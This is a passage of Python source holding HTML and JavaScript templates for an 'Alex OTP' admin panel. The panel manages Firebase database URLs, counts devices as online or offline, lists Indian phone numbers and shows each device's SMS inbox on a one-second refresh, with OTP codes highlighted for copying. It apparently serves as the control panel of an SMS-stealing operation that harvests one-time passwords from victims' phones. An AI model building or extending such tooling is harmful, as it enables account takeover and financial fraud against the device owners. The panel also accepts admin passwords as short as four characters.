.card h3{font-size:15px;color:#334155;margin-bottom:6px;font-weight:700;display:flex;align-items:center;gap:8px}
.card p.desc{font-size:12px;color:#94a3b8;margin-bottom:16px}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#64748b;font-weight:600;margin-bottom:6px}
.pwd-wrap{position:relative}
.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;outline:none;color:#1e293b;transition:.2s}
.pwd-wrap input:focus{border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 4px rgba(139,92,246,.1)}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#94a3b8;padding:4px}
.btn{padding:14px 20px;border:none;border-radius:10px;font-weight:600;font-size:14px;transition:.2s;width:100%;min-height:50px}
.btn.primary{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
.btn.warning{background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff}
.btn:active{transform:scale(.97)}
.msg{margin-top:12px;padding:12px 14px;border-radius:10px;font-size:13px;display:none;text-align:center}
.msg.ok{background:#dcfce7;color:#166534;display:block}
.msg.err{background:#fee2e2;color:#991b1b;display:block}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
.toast.show{transform:translateX(-50%) translateY(0)}</style></head><body>

<div class="topbar">
<div class="brand"><span class="alex">Alex</span> SECURITY<span class="admin-badge">👑</span></div>
<a href="/logout" class="logout-btn">Logout</a>
<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link">🔥 Firebases</a><a href="/admin/security" class="nav-link security active">🔒 Security</a></div>
</div>

<div class="container">
<div class="card">
<h3>👤 Change User Password</h3>
<p class="desc">Ye password user panel login ke liye. MongoDB me permanent save hoga.</p>
<div class="field">
<label>New User Password</label>
<div class="pwd-wrap">
<input type="password" id="user-pwd" placeholder="Enter new user password">
<span class="toggle-pwd" onclick="togglePwd('user-pwd', event)">👁️</span>
</div>
</div>
<button class="btn primary" onclick="changeUserPwd()">Update User Password</button>
<div class="msg" id="user-msg"></div>
</div>

<div class="card">
<h3>👑 Change Admin Password</h3>
<p class="desc">Ye password admin panel login ke liye. MongoDB me permanent save hoga.</p>
<div class="field">
<label>New Admin Password</label>
<div class="pwd-wrap">
<input type="password" id="admin-pwd" placeholder="Enter new admin password">
<span class="toggle-pwd" onclick="togglePwd('admin-pwd', event)">👁️</span>
</div>
</div>
<button class="btn warning" onclick="changeAdminPwd()">Update Admin Password</button>
<div class="msg" id="admin-msg"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500); }
function togglePwd(id, e){ const i = document.getElementById(id); const t = e.target; if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; } else { i.type = 'password'; t.textContent = '👁️'; } }
function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }
async function changeUserPwd(){
  const pwd = document.getElementById('user-pwd').value.trim();
  if(!pwd || pwd.length < 4){ showMsg('user-msg', '❌ Min 4 chars', 'err'); return; }
  const r = await fetch('/api/security/change', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({role: 'user', password: pwd}) });
  const d = await r.json();
  if(d.success){ showMsg('user-msg', '✅ User password saved!', 'ok'); document.getElementById('user-pwd').value = ''; toast('✅ Changed'); }
  else { showMsg('user-msg', '❌ ' + (d.error || 'Error'), 'err'); }
}
async function changeAdminPwd(){
  const pwd = document.getElementById('admin-pwd').value.trim();
  if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ Min 4 chars', 'err'); return; }
  const r = await fetch('/api/security/change', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({role: 'admin', password: pwd}) });
  const d = await r.json();
  if(d.success){ showMsg('admin-msg', '✅ Admin password saved!', 'ok'); document.getElementById('admin-pwd').value = ''; toast('✅ Changed'); }
  else { showMsg('admin-msg', '❌ ' + (d.error || 'Error'), 'err'); }
}
</script>
</body>
</html>
"""


# ==================== FIREBASES HTML ====================
# ✅ Per-firebase online/offline count
FIREBASES_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Firebases — Alex OTP</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#7c3aed">
<style>""" + MOBILE_CSS + r"""
body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
.brand .admin-badge{font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
@media(min-width:640px){.nav{order:0;width:auto}}
.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
.nav-link.security{background:#fef3c7;color:#92400e}
.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
.conn.online{color:#16a34a;background:#dcfce7}
.conn.offline{color:#dc2626;background:#fee2e2}
.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
.container{max-width:900px;margin:0 auto;padding:14px}
.card{background:#fff;border-radius:14px;padding:16px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.card h3{font-size:13px;color:#334155;margin-bottom:12px;font-weight:700;display:flex;align-items:center;gap:8px}
.add-row{display:flex;gap:8px;flex-wrap:wrap}
.add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;outline:none;color:#1e293b;font-family:monospace}
.add-row input:focus{border-color:#8b5cf6;background:#fff}
button{padding:14px 18px;border:none;border-radius:10px;font-weight:600;font-size:14px;transition:.2s;min-height:50px}
button.primary{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
button.gray{background:#f1f5f9;color:#475569}
button.danger{background:#fef2f2;color:#dc2626}
button.danger-solid{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff}
button.green{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
button:active{transform:scale(.97)}
.bulk-area{margin-top:10px;display:none}
.bulk-area textarea{width:100%;padding:14px 12px;border-radius:10px;border:1.5px solid #e2e8f0;background:#f8fafc;font-size:13px;min-height:120px;font-family:monospace;outline:none;color:#1e293b;resize:vertical}
.bulk-area textarea:focus{border-color:#8b5cf6;background:#fff}
.bulk-area button{margin-top:8px}
.msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none}
.msg.ok{background:#dcfce7;color:#166534;display:block}
.msg.err{background:#fee2e2;color:#991b1b;display:block}
.fb-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px}
.fb-header h2{font-size:14px;font-weight:800;color:#334155;display:flex;align-items:center;gap:8px}
.fb-header .actions{display:flex;gap:6px;flex-wrap:wrap}
.fb-header .actions button{padding:10px 12px;font-size:12px;min-height:44px}
.fb-list{display:grid;gap:10px}
.fb-card{background:#fff;border-radius:14px;padding:14px;display:flex;align-items:center;gap:12px;transition:.15s;box-shadow:0 2px 6px rgba(99,102,241,.05);border:2px solid transparent;flex-wrap:wrap}
.fb-card:active{transform:scale(.98)}
.fb-icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,#fef3c7,#fde68a);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.fb-info{flex:1;min-width:0;cursor:pointer}
.fb-name{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.fb-hash{font-size:11px;color:#94a3b8;margin-top:2px;font-family:monospace;word-break:break-all}
/* ✅ Online/Offline count pills */
.fb-counts{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
.fb-count-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:3px 8px;border-radius:8px}
.fb-count-pill.online{background:#dcfce7;color:#166534}
.fb-count-pill.offline{background:#fee2e2;color:#991b1b}
.fb-count-pill.devices{background:#e0e7ff;color:#3730a3}
.fb-count-pill .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
.fb-actions{display:flex;gap:6px;flex-shrink:0}
.fb-actions button{padding:10px 12px;font-size:12px;min-height:44px}
.checkbox{width:24px;height:24px;border:2px solid #cbd5e1;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:.2s;background:#fff;color:#fff;font-size:14px;font-weight:800}
.checkbox.checked{background:linear-gradient(135deg,#7c3aed,#a855f7);border-color:#7c3aed}
.select-all{display:flex;align-items:center;gap:10px;padding:12px 16px;background:#f8fafc;border-radius:12px;margin-bottom:12px;font-size:13px;font-weight:600;color:#475569;cursor:pointer}
.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
.confirm-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(15,23,42,.6);display:none;align-items:center;justify-content:center;z-index:200;padding:20px}
.confirm-overlay.show{display:flex}
.confirm-box{background:#fff;border-radius:16px;padding:24px;max-width:400px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.confirm-box h3{font-size:18px;color:#1e293b;margin-bottom:8px}
.confirm-box p{font-size:13px;color:#64748b;margin-bottom:20px}
.confirm-box .btns{display:flex;gap:10px}
.confirm-box button{flex:1}
.loading-text{text-align:center;padding:24px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
.toast.show{transform:translateX(-50%) translateY(0)}</style></head><body>

<div class="topbar">
<div class="brand"><span class="alex">Alex</span> FIREBASES<span class="admin-badge">👑</span></div>
<div class="conn" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link active">🔥 Firebases</a><a href="/admin/security" class="nav-link security">🔒 Security</a></div>
</div>

<div class="container">
<div class="card">
<h3>➕ Add Firebase URL</h3>
<div class="add-row">
<input id="fb-url" placeholder="https://xxx.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
<button class="primary" onclick="addFirebase()">Add</button>
<button class="gray" onclick="toggleBulk()">Bulk</button>
</div>
<div id="bulk-area" class="bulk-area">
<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
<button class="green" onclick="bulkAdd()">📥 Import All</button>
</div>
<div id="fb-msg" class="msg"></div>
</div>

<div class="card">
<div class="fb-header">
<h2>🔥 All Firebases <span style="background:#f1f5f9;color:#475569;padding:3px 10px;border-radius:20px;font-size:11px" id="fb-count">0</span></h2>
<div class="actions">
<button class="danger" onclick="removeSelected()">🗑 Sel</button>
<button class="danger-solid" onclick="removeAll()">🗑 All</button>
</div>
</div>
<div class="select-all" onclick="toggleSelectAll()"><div class="checkbox" id="select-all-cb"></div><span>Select All</span></div>
<div id="loading-text" class="loading-text"><span class="spinner"></span>Loading...</div>
<div id="fb-list" class="fb-list"></div>
</div>
</div>

<div class="confirm-overlay" id="confirm-overlay">
<div class="confirm-box">
<h3 id="confirm-title">Are you sure?</h3>
<h3 id="confirm-desc">This action cannot be undone.</h3>
<div class="btns"><button class="gray" onclick="closeConfirm()">Cancel</button><button class="danger-solid" id="confirm-btn">Delete</button></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
let firebases = [];
let selected = new Set();

function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2200); }
async function checkConn(){
  try{
    const r = await fetch('/api/conn'); const d = await r.json();
    const badge = document.getElementById('conn-badge'); const txt = document.getElementById('conn-text');
    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
  }catch(e){}
}
function toggleBulk(){ const a = document.getElementById('bulk-area'); a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }
async function addFirebase(){
  const url = document.getElementById('fb-url').value.trim();
  if(!url) return showMsg('fb-msg','URL required','err');
  const r = await fetch('/api/firebases',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({url})});
  const d = await r.json();
  if(d.success){ showMsg('fb-msg','✅ Added (URL hidden)','ok'); document.getElementById('fb-url').value = ''; loadFirebases(); }
  else showMsg('fb-msg','❌ '+(d.error||'Error'),'err');
}
async function bulkAdd(){
  const txt = document.getElementById('fb-bulk').value.trim();
  if(!txt) return showMsg('fb-msg','Empty','err');
  const urls = txt.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http'));
  if(!urls.length) return showMsg('fb-msg','No valid URLs','err');
  showMsg('fb-msg',`⏳ Adding ${urls.length}...`,'ok');
  const r = await fetch('/api/firebases/bulk',{method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls})});
  const d = await r.json();
  if(d.success){ showMsg('fb-msg',`✅ Added: ${d.added}, Skip: ${d.skipped}`,'ok'); document.getElementById('fb-bulk').value = ''; loadFirebases(); }
  else showMsg('fb-msg','❌ '+(d.error||'Error'),'err');
}
function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }

async function loadFirebases(){
  document.getElementById('loading-text').style.display = 'block';
  try{
    const r = await fetch('/api/firebases'); const d = await r.json();
    if(!d.success){ document.getElementById('loading-text').textContent = '❌ '+(d.error||'Error'); return; }
    firebases = d.firebases || [];
    document.getElementById('fb-count').textContent = firebases.length;
    document.getElementById('loading-text').style.display = 'none';
    renderFirebases(); updateSelectAll();
  }catch(e){ document.getElementById('loading-text').textContent = '❌ Network error'; }
}

// ✅ Per-firebase online/offline count render
function renderFirebases(){
  const box = document.getElementById('fb-list');
  if(firebases.length === 0){ box.innerHTML = '<div class="empty">📭 No firebase added yet</div>'; return; }
  box.innerHTML = firebases.map(f => {
    const isSel = selected.has(f.id);
    const badge = f.source === 'personal_otp' ? '<span style="background:#d1fae5;color:#065f46;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:700">👤 USER</span>' : '<span style="background:#ede9fe;color:#6d28d9;font-size:9px;padding:2px 6px;border-radius:6px;font-weight:700">👑 ADMIN</span>';
    const stats = f.stats || {online: 0, offline: 0, devices: 0};
    return `
      <div class="fb-card">
        <div class="checkbox ${isSel ? 'checked' : ''}" onclick="event.stopPropagation();toggleSelect('${f.id}')">${isSel ? '✓' : ''}</div>
        <div class="fb-icon">🔥</div>
        <div class="fb-info" onclick="openFirebase('${f.id}')">
          <div class="fb-name">${escapeHtml(f.name || 'unnamed')}${badge}</div>
          <div class="fb-hash">🔒 ID: ${escapeHtml(f.hash || 'hidden')}</div>
          <div class="fb-counts">
            <span class="fb-count-pill online"><span class="dot"></span>${stats.online} Online</span>
            <span class="fb-count-pill offline"><span class="dot"></span>${stats.offline} Offline</span>
            <span class="fb-count-pill devices">📱 ${stats.devices} Devices</span>
          </div>
        </div>
        <div class="fb-actions">
          <button class="primary" onclick="event.stopPropagation();openFirebase('${f.id}')">Open</button>
          <button class="danger" onclick="event.stopPropagation();removeOne('${f.id}')">🗑</button>
        </div>
      </div>
    `;
  }).join('');
}

function openFirebase(id){ window.location.href = '/firebase/' + id; }
function toggleSelect(id){ if(selected.has(id)) selected.delete(id); else selected.add(id); renderFirebases(); updateSelectAll(); }
function toggleSelectAll(){ if(selected.size === firebases.length) selected.clear(); else selected = new Set(firebases.map(f => f.id)); renderFirebases(); updateSelectAll(); }
function updateSelectAll(){ const cb = document.getElementById('select-all-cb'); if(firebases.length > 0 && selected.size === firebases.length){ cb.classList.add('checked'); cb.textContent = '✓'; } else { cb.classList.remove('checked'); cb.textContent = ''; } }
function closeConfirm(){ document.getElementById('confirm-overlay').classList.remove('show'); }
function showConfirm(title, desc, onConfirm){
  document.getElementById('confirm-title').textContent = title;
  document.getElementById('confirm-desc').textContent = desc;
  document.getElementById('confirm-overlay').classList.add('show');
  const btn = document.getElementById('confirm-btn');
  const newBtn = btn.cloneNode(true);
  btn.parentNode.replaceChild(newBtn, btn);
  newBtn.addEventListener('click', async ()=>{ closeConfirm(); await onConfirm(); });
}
async function removeOne(id){
  showConfirm('Delete this firebase?', 'This action cannot be undone', async ()=>{
    const r = await fetch('/api/firebases/'+id, {method:'DELETE'}); const d = await r.json();
    if(d.success){ toast('✅ Deleted'); selected.delete(id); loadFirebases(); }
    else toast('❌ '+(d.error||'Error'));
  });
}
async function removeSelected(){
  if(selected.size === 0) return toast('❌ Select at least one');
  const ids = Array.from(selected);
  showConfirm(`Delete ${ids.length} firebase(s)?`, 'Cannot be undone', async ()=>{
    const r = await fetch('/api/firebases/bulk-delete', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ids})}); const d = await r.json();
    if(d.success){ toast(`✅ Deleted: ${d.deleted}`); selected.clear(); loadFirebases(); }
    else toast('❌ '+(d.error||'Error'));
  });
}
async function removeAll(){
  if(firebases.length === 0) return toast('❌ No firebases');
  showConfirm(`Delete ALL ${firebases.length}?`, 'Cannot be undone!', async ()=>{
    const r = await fetch('/api/firebases/all', {method:'DELETE'}); const d = await r.json();
    if(d.success){ toast(`✅ Deleted all: ${d.deleted}`); selected.clear(); loadFirebases(); }
    else toast('❌ '+(d.error||'Error'));
  });
}
function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

checkConn();
loadFirebases();
setInterval(checkConn, 8000);
// ✅ Auto refresh firebases every 15s so counts update
setInterval(loadFirebases, 15000);
</script>
</body>
</html>
"""


# ==================== FIREBASE VIEW HTML ====================
FIREBASE_VIEW_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Firebase — Alex OTP</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#7c3aed">
<style>""" + MOBILE_CSS + r"""
body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
.brand{font-size:16px;font-weight:800}
.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
@media(min-width:640px){.nav{order:0;width:auto}}
.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
.container{max-width:900px;margin:0 auto;padding:14px}
.hero{background:#fff;border-radius:14px;padding:16px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.hero h1{font-size:16px;font-weight:800;color:#1e293b;margin-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.hero .hash{font-size:11px;color:#94a3b8;font-family:monospace;margin-bottom:14px}
.hero-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:8px}
.hs{background:#f8fafc;border-radius:10px;padding:12px;text-align:center}
.hs b{display:block;font-size:20px;font-weight:800;color:#7c3aed;margin-bottom:2px}
.hs span{font-size:10px;color:#94a3b8;text-transform:uppercase;font-weight:600;letter-spacing:.5px}
.hs.online b{color:#16a34a}
.hs.offline b{color:#dc2626}
.hs.otp b{color:#a855f7}
.list-header{display:flex;justify-content:space-between;align-items:center;margin:20px 0 12px;padding:0 4px}
.list-header h2{font-size:14px;font-weight:700;color:#334155}
.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
.search-box{margin-bottom:12px}
.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px}
.num-card:active{transform:scale(.98);background:#fafafa}
.num-icon{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#dcfce7,#bbf7d0);display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0}
.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
.num-info{flex:1;min-width:0}
.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.num-title.unknown{color:#94a3b8;font-style:italic}
.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626}
.arrow{color:#cbd5e1;font-size:20px}
.card-actions{display:flex;gap:6px;flex-shrink:0}
.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px}
.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
.inbox-status.offline{color:#dc2626}
.inbox-status.offline .dot{background:#dc2626}
.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center}
.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
.top-number-badge .tn-info{flex:1;min-width:0}
.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.sms-item{padding:16px;border-bottom:1px solid #f1f5f9}
.sms-item:last-child{border-bottom:none}
.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
.sender{font-size:12px;font-weight:800;color:#ef4444;display:flex;align-items:center;flex-wrap:wrap}
.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px}
.sms-time{font-size:11px;color:#94a3b8}
.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700}
.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;min-height:40px}
.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
.loading-text{text-align:center;padding:24px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#8b5cf6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none}
.toast.show{transform:translateX(-50%) translateY(0)}
.hidden{display:none !important}</style></head><body>

<div class="topbar">
<div class="brand"><span class="alex">Alex</span> — FIREBASE</div>
<div class="nav"><a href="/admin/dashboard" class="nav-link">📱 Numbers</a><a href="/firebases" class="nav-link active">🔥 Firebases</a><a href="/admin/security" class="nav-link" style="background:#fef3c7;color:#92400e">🔒</a></div>
</div>

<div class="container">
<div class="hero">
<h1>🔥 <span id="fb-name">Loading...</span></h1>
<div class="hash">🔒 ID: <span id="fb-hash">hidden</span></div>
<div class="hero-stats">
<div class="hs"><b id="h-dev">0</b><span>Devices</span></div>
<div class="hs online"><b id="h-on">0</b><span>Online</span></div>
<div class="hs offline"><b id="h-off">0</b><span>Offline</span></div>
<div class="hs otp"><b id="h-otp">0</b><span>OTPs</span></div>
</div>
</div>

<div id="list-view">
<div class="loading-text" id="loading-text"><span class="spinner"></span>Loading...</div>
<div id="list-content" class="hidden">
<div class="search-box"><input id="search-num" placeholder="🔎 Search" oninput="renderNumbers()"></div>
<div class="list-header"><h2>📱 Numbers</h2><span class="count" id="num-count">0</span></div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
<div class="inbox-meta"><span>⚡ auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
const FB_ID = "{{FB_ID}}";
let numbers = [];
let currentNum = null;
let refreshTimer = null;
let lastInboxSig = '';

function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 1800); }

async function loadFirebase(){
  try{
    const r = await fetch('/api/firebase/' + FB_ID); const d = await r.json();
    if(!d.success){ document.getElementById('loading-text').innerHTML = '❌ '+(d.error||'Error'); return; }
    document.getElementById('fb-name').textContent = d.name || 'unnamed';
    document.getElementById('fb-hash').textContent = d.hash || 'hidden';
    document.getElementById('h-dev').textContent = d.device_count;
    document.getElementById('h-on').textContent = d.online_count;
    document.getElementById('h-off').textContent = d.offline_count || 0;
    document.getElementById('h-otp').textContent = d.otp_count;
    numbers = d.numbers || [];
    document.getElementById('num-count').textContent = numbers.length;
